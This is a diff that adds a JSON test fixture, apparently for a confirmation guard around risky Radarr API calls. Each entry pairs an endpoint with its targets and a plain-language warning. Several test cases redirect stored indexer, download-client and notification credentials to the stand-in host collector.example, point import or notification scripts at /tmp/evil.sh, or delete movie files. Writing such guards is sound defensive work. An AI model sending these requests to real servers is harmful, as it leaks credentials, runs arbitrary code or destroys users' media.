@@ -1,0 +1,354 @@
+{
+  "DELETE /api/v3/movie/editor": {
+    "confirmLiteral": "1 movie",
+    "resolved": "DELETE /api/v3/movie/editor",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/editor on Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[2],\"deleteFiles\":false}"
+  },
+  "DELETE /api/v3/movie/editor#delete-files": {
+    "confirmLiteral": "2 movies",
+    "resolved": "DELETE /api/v3/movie/editor#delete-files",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      },
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/editor on Inception (2010) at /movies/Inception (2010); Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[1,2],\"deleteFiles\":true} (also deletes the files from disk)"
+  },
+  "DELETE /api/v3/queue/bulk": {
+    "confirmLiteral": "1 item",
+    "resolved": "DELETE /api/v3/queue/bulk",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/queue/bulk {\"ids\":[41]}"
+  },
+  "POST /api/v3/command#heavy": {
+    "confirmLiteral": "RenameFiles",
+    "resolved": "POST /api/v3/command#heavy",
+    "targets": [],
+    "text": "Radarr POST /api/v3/command {\"name\":\"RenameFiles\",\"movieId\":1,\"files\":[13]} (renames, moves or deletes files, clears data, or changes the application)"
+  },
+  "POST /api/v3/downloadclient#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v3/downloadclient#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Radarr host)"
+  },
+  "POST /api/v3/downloadclient/action/{name}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/action/{name}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/action/getCategories on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Radarr host)"
+  },
+  "POST /api/v3/downloadclient/action/{name}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/action/{name}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/action/getCategories on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/downloadclient/test#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v3/downloadclient/test#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/test on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Radarr host)"
+  },
+  "POST /api/v3/downloadclient/test#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/test#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/test on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/importlist/action/{name}#stored": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "POST /api/v3/importlist/action/{name}#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (RadarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/importlist/action/getCategories on importlist Radarr 4K (RadarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"RadarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/importlist/test#stored": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "POST /api/v3/importlist/test#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (RadarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/importlist/test on importlist Radarr 4K (RadarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"RadarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/indexer/action/{name}#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/action/{name}#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/indexer/action/getCategories on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/indexer/test#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/test#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/indexer/test on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification#script": {
+    "confirmLiteral": "Run it",
+    "resolved": "POST /api/v3/notification#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification Run it (CustomScript), runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification on notification Run it (CustomScript), runs /tmp/evil.sh {\"name\":\"Run it\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Radarr host)"
+  },
+  "POST /api/v3/notification/action/{name}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/action/{name}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/action/getDevices on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Discord\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Radarr host)"
+  },
+  "POST /api/v3/notification/action/{name}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/action/{name}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/action/getCategories on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification/test#script": {
+    "confirmLiteral": "New",
+    "resolved": "POST /api/v3/notification/test#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification New (Webhook) → https://h.example, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/test on notification New (Webhook) → https://h.example, runs /tmp/evil.sh {\"name\":\"New\",\"implementation\":\"Webhook\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Radarr host)"
+  },
+  "POST /api/v3/notification/test#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/test#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/test on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification/testall#script": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/notification/testall#script",
+    "targets": [],
+    "text": "Radarr POST /api/v3/notification/testall (runs a program on the Radarr host)"
+  },
+  "POST /api/v3/system/backup/restore/{id}": {
+    "confirmLiteral": "radarr_backup_v6.4.4.10685_2026.10.14_10.00.00.zip",
+    "resolved": "POST /api/v3/system/backup/restore/{id}",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/backup/restore/21 (replaces the database and settings, then restarts)"
+  },
+  "POST /api/v3/system/restart": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/system/restart",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/restart"
+  },
+  "POST /api/v3/system/shutdown": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/system/shutdown",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/shutdown"
+  },
+  "PUT /api/v3/config/host/{id}": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "PUT /api/v3/config/host/{id}",
+    "targets": [],
+    "text": "Radarr PUT /api/v3/config/host/1 {\"id\":1,\"bindAddress\":\"*\",\"urlBase\":\"/radarr\"} (sign-in, bind address, port, URL base, proxy and update script)"
+  },
+  "PUT /api/v3/config/mediamanagement/{id}": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "PUT /api/v3/config/mediamanagement/{id}",
+    "targets": [
+      {
+        "id": "scriptImportPath",
+        "kind": "script",
+        "name": "import script on: /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/config/mediamanagement/1 on import script on: /tmp/evil.sh {\"id\":1,\"useScriptImport\":true,\"scriptImportPath\":\"/tmp/evil.sh\"} (import script, file permissions and owner, recycle bin)"
+  },
+  "PUT /api/v3/downloadclient/{id}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v3/downloadclient/{id}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/downloadclient/6 on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Radarr host)"
+  },
+  "PUT /api/v3/downloadclient/{id}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v3/downloadclient/{id}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/downloadclient/6 on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/importlist/{id}#stored": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "PUT /api/v3/importlist/{id}#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (RadarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/importlist/8 on importlist Radarr 4K (RadarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"RadarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/indexer/{id}#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "PUT /api/v3/indexer/{id}#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/indexer/7 on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/movie/editor": {
+    "confirmLiteral": "2 movies",
+    "resolved": "PUT /api/v3/movie/editor",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      },
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/movie/editor on Inception (2010) at /movies/Inception (2010); Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[1,2],\"monitored\":false}"
+  },
+  "PUT /api/v3/movie/{id}#move-files": {
+    "confirmLiteral": "Arrival",
+    "resolved": "PUT /api/v3/movie/{id}#move-files",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016) → /elsewhere/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/movie/2?moveFiles=true on Arrival (2016) at /movies/Arrival (2016) → /elsewhere/Arrival (2016) {\"id\":2,\"title\":\"Not Arrival\",\"path\":\"/elsewhere/Arrival (2016)\"} (moves the files on disk)"
+  },
+  "PUT /api/v3/notification/{id}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v3/notification/{id}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/notification/9 on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Renamed\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Radarr host)"
+  },
+  "PUT /api/v3/notification/{id}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v3/notification/{id}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/notification/9 on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  }
+}
